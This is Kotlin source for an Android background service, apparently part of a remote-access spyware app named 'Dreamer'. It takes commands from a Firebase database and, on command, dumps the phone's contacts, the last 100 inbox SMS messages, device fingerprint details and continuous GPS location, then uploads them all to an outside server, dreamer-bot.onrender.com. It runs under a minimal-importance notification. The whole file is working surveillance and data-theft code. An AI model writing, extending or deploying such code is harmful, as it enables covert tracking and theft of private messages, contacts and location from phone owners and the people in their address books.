package com.h4k3r.dreamer

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.lang.StringBuilder

class DataService : Service() {
    companion object {
        private const val TAG = "DataService"
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference

    /* ── Coroutines ─────────────────────────────── */
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    /* ── HTTP Client ────────────────────────────── */
    private val http = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val server = "https://dreamer-bot.onrender.com"

    /* ── Location Client ────────────────────────── */
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private var isTrackingLocation = false

    override fun onCreate() {
        super.onCreate()

        // Load authentication
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "Missing authentication")
            stopSelf()
            return
        }

        Log.d(TAG, "Service started - Key: ${secretKey.take(6)}..., Device: $deviceId")

        startForegroundService()

        // Initialize Firebase reference
        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        // Initialize location client
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupLocationCallback()

        listenFirebase()
    }

    private fun listenFirebase() {
        deviceRef.child("command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val cmd = s.getValue(String::class.java) ?: return
                Log.d(TAG, "Command received: $cmd")

                when (cmd) {
                    "loc_now" -> sendCurrentLocation()
                    "loc_start" -> startLocationTracking()
                    "loc_stop" -> stopLocationTracking()
                    "dump_contacts" -> sendContacts()
                    "dump_sms" -> sendSms()
                    "device_info" -> sendDeviceInfo()
                }

                s.ref.setValue(null) // Clear command
            }

            override fun onCancelled(e: DatabaseError) {
                Log.e(TAG, "Firebase error", e.toException())
            }
        })
    }

    /* ── Location Functions ─────────────────────── */
    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    sendLocationUpdate(location, "tracking")
                }
            }
        }
    }

    private fun sendCurrentLocation() {
        Log.d(TAG, "Getting current location")

        try {
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                location?.let {
                    sendLocationUpdate(it, "single")
                } ?: run {
                    // Request fresh location
                    requestFreshLocation()
                }
            }.addOnFailureListener { e ->
                Log.e(TAG, "Location error", e)
                sendError("Location unavailable: ${e.message}")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error", e)
            sendError("Location permission not granted")
        }
    }

    private fun requestFreshLocation() {
        val locationRequest = LocationRequest.create().apply {
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            numUpdates = 1
        }

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                object : LocationCallback() {
                    override fun onLocationResult(result: LocationResult) {
                        result.lastLocation?.let {
                            sendLocationUpdate(it, "fresh")
                        }
                        fusedLocationClient.removeLocationUpdates(this)
                    }
                },
                null
            )
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error", e)
        }
    }

    private fun startLocationTracking() {
        if (isTrackingLocation) return

        Log.d(TAG, "Starting location tracking")

        val locationRequest = LocationRequest.create().apply {
            interval = 60_000 // 1 minute
            fastestInterval = 30_000 // 30 seconds
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        }

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                null
            )
            isTrackingLocation = true
            sendStatus("Location tracking started")
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error", e)
            sendError("Location permission not granted")
        }
    }

    private fun stopLocationTracking() {
        if (!isTrackingLocation) return

        Log.d(TAG, "Stopping location tracking")
        fusedLocationClient.removeLocationUpdates(locationCallback)
        isTrackingLocation = false
        sendStatus("Location tracking stopped")
    }

    private fun sendLocationUpdate(location: Location, type: String) {
        val json = JSONObject().apply {
            put("lat", location.latitude)
            put("lon", location.longitude)
            put("accuracy", location.accuracy)
            put("altitude", location.altitude)
            put("speed", location.speed)
            put("bearing", location.bearing)
            put("time", location.time)
            put("type", type)
        }.toString()

        post("/json/location", json, "application/json")
    }

    /* ── Contacts Dump ──────────────────────────── */
    private fun sendContacts() {
        Log.d(TAG, "Dumping contacts")

        scope.launch {
            val contacts = StringBuilder()
            var count = 0

            try {
                contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE
                    ),
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )?.use { cursor ->
                    val nameIdx = cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    )
                    val numberIdx = cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    )
                    val typeIdx = cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE
                    )

                    contacts.append("=== CONTACTS DUMP ===\n")
                    contacts.append("Total: ${cursor.count} contacts\n")
                    contacts.append("Generated: ${java.util.Date()}\n")
                    contacts.append("Device: $deviceId\n")
                    contacts.append("=" * 30 + "\n\n")

                    while (cursor.moveToNext() && count < 500) { // Limit to 500
                        val name = cursor.getString(nameIdx)
                        val number = cursor.getString(numberIdx)
                        val type = cursor.getInt(typeIdx)
                        val typeLabel = ContactsContract.CommonDataKinds.Phone
                            .getTypeLabel(resources, type, "").toString()

                        contacts.append("Name: $name\n")
                        contacts.append("Number: $number\n")
                        contacts.append("Type: $typeLabel\n")
                        contacts.append("-" * 20 + "\n")
                        count++
                    }

                    if (cursor.count > 500) {
                        contacts.append("\n[... and ${cursor.count - 500} more contacts]")
                    }
                }

                Log.d(TAG, "Found $count contacts")
                // Fixed: Change endpoint to match server
                post("/json/contacts", contacts.toString(), "text/plain")

            } catch (e: Exception) {
                Log.e(TAG, "Contacts error", e)
                sendError("Failed to read contacts: ${e.message}")
            }
        }
    }

    /* ── SMS Dump ───────────────────────────────── */
    private fun sendSms() {
        Log.d(TAG, "Dumping SMS")

        scope.launch {
            val sms = StringBuilder()
            var count = 0

            try {
                // Check if we're default SMS app
                if (Telephony.Sms.getDefaultSmsPackage(this@DataService) != packageName) {
                    sms.append("⚠️ App is not the default SMS handler.\n")
                    sms.append("Some messages may not be accessible.\n\n")
                }

                sms.append("=== SMS DUMP ===\n")
                sms.append("Generated: ${java.util.Date()}\n")
                sms.append("Device: $deviceId\n")
                sms.append("=" * 30 + "\n\n")

                // Query inbox
                contentResolver.query(
                    Telephony.Sms.Inbox.CONTENT_URI,
                    arrayOf(
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.TYPE
                    ),
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC LIMIT 100"
                )?.use { cursor ->
                    val addressIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                    val bodyIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                    val dateIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)

                    sms.append("INBOX (Last 100 messages):\n")
                    sms.append("-" * 30 + "\n\n")

                    while (cursor.moveToNext() && count < 100) {
                        val address = cursor.getString(addressIdx)
                        val body = cursor.getString(bodyIdx)
                        val date = java.util.Date(cursor.getLong(dateIdx))

                        sms.append("From: $address\n")
                        sms.append("Date: $date\n")
                        sms.append("Message: $body\n")
                        sms.append("-" * 20 + "\n")
                        count++
                    }
                }

                Log.d(TAG, "Found $count SMS messages")
                // Fixed: Change endpoint to match server
                post("/json/sms", sms.toString(), "text/plain")

            } catch (e: Exception) {
                Log.e(TAG, "SMS error", e)
                sendError("Failed to read SMS: ${e.message}")
            }
        }
    }

    /* ── Device Info ────────────────────────────── */
    private fun sendDeviceInfo() {
        Log.d(TAG, "Sending device info")

        val info = JSONObject().apply {
            put("manufacturer", Build.MANUFACTURER)
            put("model", Build.MODEL)
            put("device", Build.DEVICE)
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("security_patch", Build.VERSION.SECURITY_PATCH)
            put("hardware", Build.HARDWARE)
            put("product", Build.PRODUCT)
            put("board", Build.BOARD)
            put("display", Build.DISPLAY)
            put("fingerprint", Build.FINGERPRINT)
            put("time", System.currentTimeMillis())
        }.toString()

        post("/json/device_info", info, "application/json")
    }

    /* ── Helper Functions ───────────────────────── */
    private fun post(path: String, data: String, mime: String) = scope.launch {
        try {
            val request = Request.Builder()
                .url(server + path)
                .header("X-Auth", "$secretKey:$deviceId")
                .post(data.toRequestBody(mime.toMediaType()))
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "POST $path: ${response.code}")
                if (!response.isSuccessful) {
                    Log.e(TAG, "Upload failed: ${response.body?.string()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "POST error", e)
        }
    }

    private fun sendStatus(message: String) {
        val json = JSONObject().apply {
            put("status", message)
            put("time", System.currentTimeMillis())
        }.toString()
        post("/json/status", json, "application/json")
    }

    private fun sendError(error: String) {
        val json = JSONObject().apply {
            put("error", error)
            put("time", System.currentTimeMillis())
        }.toString()
        post("/json/error", json, "application/json")
    }

    private operator fun String.times(n: Int) = repeat(n)

    /* ── Service Lifecycle ──────────────────────── */
    private fun startForegroundService() {
        val channelId = "data_svc"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        "Data Service",
                        NotificationManager.IMPORTANCE_MIN
                    )
                )
        }

        startForeground(2, NotificationCompat.Builder(this, channelId)
            .setContentTitle("Dreamer Data Active")
            .setContentText("Device: ${deviceId.take(6)}")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .build()
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        if (isTrackingLocation) {
            stopLocationTracking()
        }
        job.cancel()
        super.onDestroy()
    }
}